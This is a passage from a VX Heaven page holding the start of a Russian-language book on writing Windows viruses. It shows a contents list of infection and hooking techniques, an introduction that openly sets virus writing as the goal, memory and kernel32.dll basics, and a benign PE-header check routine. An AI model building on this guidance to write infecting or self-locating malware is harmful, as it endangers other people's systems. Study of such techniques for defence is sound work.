<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Bill Prisoner 'От зеленого к красному' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Bill Prisoner"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Bill Prisoner,От зеленого к красному, push, invoke, import, image, dword, endif, func, offset, bound, file, long, delay, define, kernel, http"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c2f8385687da9032261f6a7764e7bc2623546428-1498757854-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vbp01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>От зеленого к красному</h1><p><a href="/lib/?lang=ru&amp;author=Bill%20Prisoner"> Bill Prisoner</a><br/> <em>Июль 2005</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vbp01.html';</script>[<a style="" href="/lib/?lang=RU&amp;index=WI#vbp01">Вернуться к списку</a>] [<a href="/lib/vbp01.html#disqus_thread">Комментарии</a>]<br/> <form method="post" action="">
<img src="/img/cache/0b9fd596a90421f9f1f68a9760275737.gif" alt="\text{T_EX size}" valign="middle"/>
<select name="TeX_size"><option value="-2">-2</option><option value="-1">-1</option><option value="0" selected="selected">0</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option> </select>
<input type="submit" value="Scale"/>
</form>
<ul>
<li><a href="#c0">Введение</a></li>
<li><a href="#c1">Глава 1: Память. База kernel32.dll. Адреса API-функций. Дельта-смещение.</a>
<ul>
<li><a href="#c11">Адресное пространство процесса</a></li>
<li><a href="#c12">Страницы и регионы</a></li>
<li><a href="#c13">Библиотека kernel32.dll</a>
<ul>
<li><a href="#c131">Получение базы kernel32.dll</a></li>
</ul></li>
<li><a href="#c14">Проверка PE-файла на правильность</a></li>
<li><a href="#c15">Получение базы</a></li>
<li><a href="#c16">Способы получения адреса в kernel32.dll</a>
<ul>
<li><a href="#c161">Способ 1: Адрес возврата</a></li>
<li><a href="#c162">Способ 2: SEH</a></li>
<li><a href="#c163">Способ 3: Таблица импорта</a></li>
</ul></li>
<li><a href="#c17">Поиск адресов API-функций</a>
<ul>
<li><a href="#c171">Поиск GetProcAddress</a></li>
<li><a href="#c172">Получение остальных адресов функций</a></li>
</ul></li>
<li><a href="#c18">Дельта смещение</a>
<ul>
<li><a href="#c181">Использование дельта смещения</a></li>
</ul></li>
<li><a href="#c19">Защита</a></li>
<li><a href="#c1a">Благодарности</a></li>
</ul></li>
<li><a href="#c2">Глава 2: Формат исполняемого файла ОС Windows. PE32 и PE64. Способы заражения исполняемых файлов.</a>
<ul>
<li><a href="#c21">Введение</a></li>
<li><a href="#c22">Общий вид PE-файла</a></li>
<li><a href="#c23">Терминология применимая для файлов PE-формата</a></li>
<li><a href="#c24">DOS-MZ заголовок</a></li>
<li><a href="#c25">Файловый заголовок</a></li>
<li><a href="#c26">Опциональный заголовок</a></li>
<li><a href="#c27">Работа с заголовками PE-файла</a></li>
<li><a href="#c28">Работа с таблицей директорий</a></li>
<li><a href="#c29">Таблица секций</a></li>
<li><a href="#c2a">Работа с таблицей секций</a></li>
<li><a href="#c2b">Таблица Экспорта</a></li>
<li><a href="#c2c">Как происходит экспорт</a>
<ul>
<li><a href="#c2c1">Передача экспорта</a></li>
</ul></li>
<li><a href="#c2d">Работа с таблицей экспорта</a></li>
<li><a href="#c2e">Таблица импорта</a></li>
<li><a href="#c2f">Структуры и термины импорта</a></li>
<li><a href="#c2g">Стандартный механизм импорта</a></li>
<li><a href="#c2h">Пример работы с таблицей импорта</a></li>
<li><a href="#c2i">Биндинг</a></li>
<li><a href="#c2j">Bound-импорт</a></li>
<li><a href="#c2k">Пример работы с Bound-импортом</a></li>
<li><a href="#c2l">Delay-импорт</a></li>
<li><a href="#c2m">Пример работы с Delay-импортом</a></li>
<li><a href="#c2n">Особенности импорта на конкретных реализациях загрузчиков</a></li>
<li><a href="#c2o">Базовые поправки</a></li>
<li><a href="#c2p">Пример работы с базовыми поправками</a></li>
<li><a href="#c2r">Программа PE Inside Console Version</a></li>
<li><a href="#c2s">Программа PE Inside v0.5alfa</a></li>
<li><a href="#c2t">PE64</a></li>
<li><a href="#c2u">Домашнее задание</a></li>
<li><a href="#c2v">Способы внедрения внутрь исполняемого файла</a></li>
<li><a href="#c2w">Поиск файлов</a></li>
<li><a href="#c2x">Проверка PE-файла на правильность</a></li>
<li><a href="#c2y">Способ 1. Внедрение в заголовок</a></li>
<li><a href="#c2z">Получение важных частей отображения</a></li>
<li><a href="#c2aa">Переход на старый AddressOfEntryPoint</a></li>
<li><a href="#c2ab">Код инфектора</a></li>
<li><a href="#c2ac">Способ 2. Запись в конец последней секции</a></li>
<li><a href="#c2ad">Итоговый размер файла</a></li>
<li><a href="#c2ae">Код инфектора</a></li>
<li><a href="#c2af">Cпособ 3. Добавление новой секции</a></li>
<li><a href="#c2ag">Код инфектора</a></li>
<li><a href="#c2ah">Способ 4. Удаление базовых поправок</a></li>
<li><a href="#c2ai">Полезная нагрузка(payload)</a></li>
<li><a href="#c2aj">Продвинутые приемы при заражении PE-файлов</a></li>
<li><a href="#c2ak">Источники для дальнейших исследований</a></li>
<li><a href="#c2al">Резюме</a></li>
</ul></li>
<li><a href="#c3">Глава 3: Программирование в Shell-код стиле. Важные техники системного программирования: SEH, VEH и API Hooking. Отключение Windows File Protection.</a>
<ul>
<li><a href="#c31">Программирование в Shell-код стиле</a></li>
<li><a href="#c32">Обобщенный пример программирования в Shell-код стиле</a></li>
</ul></li>
<li><a href="#c4">Важные техники системного программирования</a>
<ul>
<li><a href="#c41">Structured Exception Handling</a>
<ul>
<li><a href="#c411">Введение</a></li>
<li><a href="#c412">Конечный обработчик</a></li>
<li><a href="#c413">Внутри-поточный обработчик</a></li>
<li><a href="#c414">Продолжение выполнения с безопасного места</a></li>
<li><a href="#c415">Заключение</a></li>
</ul></li>
<li><a href="#c42">Vectored Exception Handling (VEH)</a>
<ul>
<li><a href="#c421">VEH изнутри</a></li>
</ul></li>
<li><a href="#c43">Перехват вызовов функций</a>
<ul>
<li><a href="#c431">Общая картина</a></li>
<li><a href="#c432">Привилегии</a></li>
</ul></li>
<li><a href="#c44">Dinamic Link Library</a>
<ul>
<li><a href="#c441">Общая картина</a></li>
</ul></li>
<li><a href="#c45">Создание DLL</a>
<ul>
<li><a href="#c451">Внедрение и исполнение удаленного кода</a></li>
</ul></li>
<li><a href="#c46">Способы перехвата функций</a>
<ul>
<li><a href="#c461">Правка таблицы импорта</a></li>
<li><a href="#c462">Простой пример - перехват MessageBox</a></li>
<li><a href="#c463">Перехват LoadLibrary</a></li>
</ul></li>
<li><a href="#c47">Сплайсинг</a>
<ul>
<li><a href="#c471">Простой пример - перехват MessageBox</a></li>
<li><a href="#c472">Сплайсинг с сохранением оригинальной функции</a></li>
<li><a href="#c473">Перехват правкой системных библиотек на жестком диске</a></li>
<li><a href="#c474">Windows File Protection</a></li>
<li><a href="#c475">Отключение Windows File Protection на лету</a></li>
<li><a href="#c476">Глобальный перехват</a></li>
</ul></li>
</ul></li>
<li><a href="#c5">Примеры использования перехвата вызовов функций</a></li>
<li><a href="#c6">Использованные источники и источники для дальнейших исследований</a>
<ul>
<li><a href="#c61">SEH и VEH</a></li>
<li><a href="#c62">Windows File Protection</a></li>
<li><a href="#c63">API Hooking</a></li>
</ul></li>
<li><a href="#c7">Заключение</a></li>
<li><a href="#c8">The Passion Of Code (TPOC) Laboratory</a></li>
<li><a href="#c9">Спасибо...</a></li>
</ul>
<h2><a name="c0"></a>Введение</h2>
<p>Здравствуйте дамы и господа! Название книги не говорит само за себя. Эта книга посвящена современным ныне компьютерным вирусам для ОС семейства Windows. Я не буду рассматривать здесь устаревшие методики получения ring 0, которую мы использовали в Windows 98, а также никаких других специфических особенностей применимых для Windows 9x. Мы вдоль и поперек исследуем с Вами средства, механизмы и способы действия вирусных программ применимых для ОС Windows XP, а также родственные ей, т.е. все NT. Почему Windows XP? Да потому, что она использует все средства NT, плюс по данным некоторых аналитических компаний, в частности авторитетной Gartner (http://www.gartner.com), эта ОС просуществует дольше всех ОС из семейства Windows. Gartner считает, что на следующую ОС (Windows Longhorn) надеяться вообще не имеет смысла, т.к из нее будут убраны те революционные нововведения, которые планировались сначала - файловая система WinFS и другие технологии. По данным аналитиков компании, ОС Windows XP просуществует до 2011 года, в тоже время Windows 2003 Server просуществует до 2010 года. Корпоративным стандартом на начало 2005 года считается Windows XP с Service Pack 2. Вот на упомянутые системы мы и будет ориентироваться в ближайшем будущем. Конечно рассылка аналитических компаний это всего лишь предположение и обстановка может измениться в любой момент. Но не надо волноваться сильно по этому поводу, т.к. концепции ОС Windows остаются еще с 1995 года. Вы видели оглавление и, наверное, удивились как много охватывают вирусы. Не удивляйтесь, это все когда-то использовали компьютерные вирусы под Windows и Вы конечно должны об этом знать, чтобы создавать свои новые средства или использовать существующие. Все примеры из этой книги будут написаны используя компилятор masm32. Не спрашивайте пока меня почему masm. Просто masm и все :). Но в одной из глав мы исследует все известные компиляторы. Там я и объясню Вам что к чему. Естественно все самые быстрые, незаметные и разрушительные вирусы пишутся на ассемблере. Если у Вас есть иное мнение, то сначала научитесь программировать вирусы на ассемблере, а потом делайте все что угодно. С ассемблером приходит настоящие понимание того, что делаешь, а разные HLL (High Level Language) только добавляют сложности и в без того сложные вещи. Почти весь материал ориентирован на операционные системы Windows, но я также буду исследовать ныне очень модные вирусы для мобильных телефонов и автомобилей. И если появятся в ближайшем будущем, то и вирусы для кофеварок и пылесосов :) Данная книга была написана для того, чтобы показать как работают вирусы и, следовательно, как с ними бороться. Материал будет сопровождать много кода, который вынесен в отдельные функции. Эти функции Вы можете использовать, даже не разбираясь в тонкостях функционирования той или иной функции. Автор не несет ответственности за данную информацию, если она будет использоваться в незаконных целях. Вместе с этом я предлагаю методы защиты.</p>
<p>Я не буду философствовать на тему: "Кто такие вирмейкеры и зачем они пишут вирусы-, пусть этим занимаются "философы-. Я же буду Вам объяснять, как работают эти зверушки.</p>
<p>Эта книга содержит в себе очень много материала. Она поможет не только антивирусным работникам, но и простым программистам. Здесь будет содержаться много готового кода. Изложение ведется научно. То есть все положения объясняются исходя из свойств операционной системы.</p>
<p>Если какая-то глава вышла, и у меня появились новые сведения по этой проблеме, то я буду обновлять материал. Поэтому если у Вас возникают какие-то вопросы или непонятки, то отсылайте все мне на почтовый ящик. Я работаю круглосуточно.</p>
<p>Почему книга называется "От зеленого к красному"? Потому что она должна как-то называться. Название вызывает любопытство, не правда ли? Я хотел выдать оглавление прямо во введении, но я передумал. Так Вам будет гораздо интереснее.</p>
<p>Море информации находиться на сайте http://vx.netlux.org. Самый известный российский вирмейкер - z0mbie пока не имеет сайта. Но у него есть ЖЖ: http://www.livejournal.com/users/zasrakomondohuy.</p>
<p>Я принимаю любую критику на своем почтовом ящике. Если Вы нашли неточность, сообщите мне. Просто я уважаю своего читателя и хочу, чтобы Вы знали все. На этом введение я заканчиваю. Всего Вам хорошего.</p>
<div align="right">[C] Bill Prisoner / TPOC</div>
<h2><a name="c1"></a>Глава 1: Память. База kernel32.dll. Адреса API-функций. Дельта-смещение.</h2>
<h3><a name="c11"></a>Адресное пространство процесса</h3>
<p>База - это адрес чего-то, что лежит в адресном пространстве текущего процесса. Для каждой программы в <strong>Windows</strong> существует свое адресное пространство. Его объем 4Гб. Т.к. на самом деле такого количества памяти нет, и адреса памяти не соответствуют физическим, поэтому его называют виртуальным адресным пространством. Противоположное этому понятие называется - физическое адресное пространство. Откуда берется столько памяти, если на машине установлено, всего лишь 256 Мб? Операционная система использует дисковое пространство. Если какие-либо куски кода или данных не нужны, она сбрасывает их на диск. Шина адреса для 32х разрядного процессора 32-х разрядная, т.е. адрес может быть 32х разрядным. Диапазон значения адреса - <strong>0..4 294 967 269d</strong>, а в шестнадцатеричной системе счисления <strong>0..0FFFFFFFFh</strong>. Скоро, когда мы будет программировать для 64-х разрядных ОС размер виртуального адресного пространства увеличиться до 16 экзабайт. Этому пространству соответствует диапазон для указателей <strong>0..0FFFFFFFFFFFFFFFFh</strong>. Каждый процесс работает в своем адресном пространстве. Это означает что если Вы создали программу и запустили ее, никакая другая программа не сможет читать или изменять данные в Вашей программе. Есть, конечно, много способов изменить такое положение вещей, но для этого надо использовать специальные механизмы. Адресное пространство процесса полностью не принадлежит ему. Более того, если мы обратимся не туда куда надо, то ОС завершит нашу программу сразу же. Почему так? Да потому, что виртуальное адресное пространство разбивается на разделы, которые имеют свое специфическое назначение. Раздел для данных и кода приложения имеет диапазон 00010000H..0BFFEFFFFH. Существует раздел для кода и данных режима ядра. Он находиться в диапазоне <strong>0C0000000H..0FFFFFFFFH</strong>. Например, в отладчике режима ядра Вы можете посмотреть в зависимости от адреса, какой код трассируется - код пользовательского режима или режима ядра. Все что Вы должны из этого для себя почерпнуть это то, что все пространство памяти делиться на куски, которые имеют свое назначение. Также есть такие разделы - для выявления нулевых указателей, закрытый раздел. Я не привожу диапазоны, т.к. они обычно не нужны. Диапазоны, которые я привел, справедливы для ОС <strong>Windows XP</strong>. Вообще, в ОС отличных от <strong>Windows</strong> <strong>XP</strong> могут быть другие диапазоны и другие наборы разделов, если Вас это интересует, то Вы можете узнать их точно на сайте производителя этих самых ОС, нашу горячо любимую корпорацию <strong>Micro$oft</strong>(<a href="http://www.microsoft.com">http://www.microsoft.com</a>). В базовом разделе <strong>Platform SDK</strong> говорится, что нижние 2 Гб относятся к коду и данным пользовательского режима, а верхние к коду и данным режима ядра. Остальные детали о регионах могут меняться с каждым выпуском обновления.</p>
<h3><a name="c12"></a>Страницы и регионы</h3>
<p>Для памяти в <strong>Windows</strong> есть унифицированная единица, которой можно манипулировать напрямую - страница(<strong>page</strong>). Странице памяти можно присвоить определенный атрибут, т.е. можно ли считывать данные со страницы или записывать и т.д. Размер страницы зависит от типа процессора. Так для процессоров с архитектурой x86 размер страницы равен 4 Кб. Для 64-разрядного процессора размер страницы может отличаться от 32-разрядного. Чтобы получить размер страницы можно использовать функцию <strong>GetSystemInfo</strong>.</p>
<p>Для того чтобы воспользоваться какой-либо частью виртуального адресного пространства мы должны сначала выделить в нем регион. Регион - эта область памяти (совокупность страниц) произвольного (но кратного) размера с одним и тем же атрибутом страниц. Операция выделения региона называется резервированием. При резервировании ОС выравнивает начало региона с учетом гранулярности выделения памяти(<strong>Allocation Granularity</strong>). Эта величина зависит от типа процессора, но для процессоров с архитектурой (<strong>x86,IA-64</strong>) она составляет 64 Кбайта. Чтобы получить значение гранулярности выделения памяти можно использовать функцию <strong>GetSystemInfo</strong>. Например, если исполняемый файл подгружает какие-нибудь <strong>DLL</strong>, то сначала он резервирует регион для этой <strong>DLL</strong> подходящего размера, а потом передает физическую память с диска на зарезервированный регион. Регион резервируется с учетом гранулярности, т.е. он будет кратен величине 64 Кб и значит, сама <strong>DLL</strong> будет размещаться по адресам кратным 64 Кб, т.к. она размещается с самого начала региона. Т.к. единица памяти - страница, то размер региона кратен размеру страницы, т.е. регион выделяется страницами.</p>
<h3><a name="c13"></a>Библиотека kernel32.dll</h3>
<p>Теперь поговорим о <strong>kernel32.dll</strong>. Это библиотека динамической компоновки(Dinamic Link Library) которая содержит основные системные подпрограммы(<strong>routines</strong>) для поддержки подсистемы <strong>Win32</strong>. Процедуры, которые мы используем в своих программах для <strong>Windows</strong>, так или иначе содержаться в <strong>kernel32.dll</strong>. Например, мы завершили выполнение своего кода и хотим корректно завершиться. Надо использовать функцию <strong>ExitProcess</strong>. Она содержится в <strong>kernel32.dll</strong>. Если мы хотим использовать функции из других <strong>DLL</strong>, то в <strong>kernel32.dll</strong> есть функция <strong>GetProcAddress</strong>, которая возвращает нам указатель на требуемую функцию. Функции <strong>GetProcAddress</strong> надо указать описатель(<strong>handle</strong>) модуля и указатель на строку с именем функции. Описатель модуля можно получить с помощью функции <strong>GetModuleHandle</strong>, которой передается указатель на строку с именем функции. Вы спросите: "А зачем получать адреса функций, если я и так могу их вызывать из своих программ?-. Дело в том, что проблем с адресами API-функций нет, если у Вас есть самостоятельный исполняемый модуль. При загрузке exe-файла ОС сама находит нужные адреса с помощью функции <strong>LoadLibrary</strong>. Обычно программисты об этом и не задумываются. Но представьте, что Вы пишете вирус, а он часто не является отдельным exe-файлом, а живет внутри файла-жертвы. Ему, для своего существования приходиться ;) вызывать разные API-функции, но их адреса он не знает. В одной и той же ОС, например <strong>Windows XP</strong>, база <strong>kernel32.dll</strong>, т.е. ее (библиотеки) начало, может быть фиксирована и иметь, например, значение <strong>7с800000h</strong>. Но в зависимости от ситуации или операционной системы этот базовый адрес может изменяться. Наша задача писать вирусы, которые могут функционировать на, как можно, большем числе платформ. Для этого нам надо сначала найти базу <strong>kernel32.dll</strong>, а потом получить адреса нужных нам API-функций из этой библиотеки. Вообще сначала нам нужна всего одна функция - <strong>GetProcAddress</strong>. Если мы используем функции из библиотек отличных от <strong>kernel32.dll</strong>, то также <strong>GetModuleHandle</strong>. Мы предполагаем, что процесс-жертва использует функции kernel32.dll. Если нужной нам библиотеки может не оказаться в адресном пространстве процесса-жертвы, то нам понадобиться и функция <strong>LoadLibrary</strong>.</p>
<p>Если мы используем процедуры из этой библиотеки kernel32.dll, то она должна быть спроецирована в адресное пространство процесса. Проецирование делается при создании объекта ядра "проекция файла-. Точно также, при загрузке exe-файла или его запуске, загрузчик создает его проекцию в адресном пространстве созданного процесса. Потом он просматривает таблицу импорта и проецирует все <strong>dll</strong> или <strong>exe</strong> нужные приложению. База <strong>kernel32.dll</strong> - это адрес в памяти, где начинается спроецированная в память библиотека.</p>
<h4><a name="c131"></a>Получение базы kernel32.dll</h4>
<p>Существует несколько способов получения базы <strong>kernel32.dll</strong>. Все они, так или иначе, опираются на какие-то тонкости ОС. Вы можете удивиться, но я в этой книге рассмотрю все известные мне способы. Все они будут представлены в виде ассемблерных процедур. (В терминологии языков программирования термины "функция- и "процедура- эквиваленты. Но язык Паскаль внес здесь свою путаницу. Я, естественно, буду руководствоваться традиционной и универсальной терминологией). Отдельные способы используют методы получения адреса в какой-нибудь процедуре из <strong>kernel32.dll</strong>. Суть метода в том, что мы каким-либо способом находим адрес произвольной процедуры в <strong>kernel32.dll</strong>. Каким способом, зависит от внутренней реализации ОС и ее особенностей. Другой способ заключается в проверке таблицы импорта.</p>
<p>Вы можете не разбираться даже в деталях реализации процедур и сразу же их использовать. Для подобного удобства около заголовка каждой из процедур будет описание входных и выходных данных. Ни одна из процедур не изменяет регистры за исключением выходного параметра. Например, если Вы вызываете процедуру <strong>ValidPE</strong>, и перед ней написано что выходной параметр помещается в регистр <strong>eax</strong>, то изменяется только регистр <strong>eax</strong>. Остальные регистры остаются с тем же содержимым что и до вызова процедуры. Признаюсь, я тут немного соврал. Не все регистры остаются с такими же значениями. Один регистр, все таки изменяется. Как Вы думаете какой? <strong>EIP</strong>. Также следите за вложенными процедурами.</p>
<h3><a name="c14"></a>Проверка PE-файла на правильность</h3>
<p>Далее я привожу процедуру проверки PE-файла на правильность. Посмотрите на код. В исполняемом файле данные расположены, как "<strong>MZ</strong>" и "<strong>PE</strong>", но мы сравниваем их наоборот. Здесь вступает в силу принцип "младший байт по младшему адресу-. Это означает, что в памяти байты данных расположены наоборот. Соль в том что "<strong>MZ</strong>" и "<strong>PE</strong>" рассматриваются не как строки, а как слова в памяти. Строки - это массив байтов. Т.е. если мы берем слово, то адрес младшего байта является адресом всего слова. А младший байт это, в случае "<strong>PE</strong>", естественно "<strong>E</strong>". Специфика микропроцессора здесь в том, как он работает с памятью и как интерпретирует адреса. Задумайтесь в связи с этим об аппаратной поддержке типов данных. Это очень важно. Вы должны хорошо это усвоить.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура ValidPE</span><br/>
<span style="color: black; font-style: italic;">;Проверка правильности PE-файла</span><br/>
<span style="color: black; font-style: italic;">;Вход: В esi - адрес файла в памяти</span><br/>
<span style="color: black; font-style: italic;">;Выход: если файл правильный, то eax=1, иначе eax=0</span><br/>
<span style="color: black; font-style: italic;">;Заметки: обычно процедура используется с проецируемыми файлами в память</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
ValidPE proc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем все регистры</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем регистр флагов</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #0000ff; font-weight: bold;">WORD</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span>==<span style="color: #7f007f;">&quot;ZM&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_DOS_HEADER&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;указание компилятору, что в esi указатель на IMAGE_DOS_HEADER</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>e_lfanew&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;переход к PE заголовку</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span>==<span style="color: #7f007f;">&quot;EP&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем значения флагов</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем значения регистров</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>TRUE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем значения флагов</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем значения регистров</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>FALSE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
ValidPE endp<br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры ValidPE</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
&nbsp;</div>
<h3><a name="c15"></a>Получение базы</h3>
<p>Допустим, что мы каким-либо способом получили адрес где-то в <strong>kernel32.dll</strong>. Способы получения такого адреса приведены в разделе "Способы получения адреса в памяти <strong>kernel32.dll</strong>". Теперь наша задача получить базу по данному адресу. В нескольких способах мы сначала получаем адрес в памяти внутри kernel32.dll. Мы используем здесь гранулярность выделения памяти, т.е. сначала выравниваем значение адреса до 64 Кб, проверяем не база ли это уже <strong>kernel32.dll</strong>, если нет, то идем шагами назад по 64 Кб. Чтобы проверить, не база ли это, проверяем правильность формата <strong>PE</strong> файла.</p>
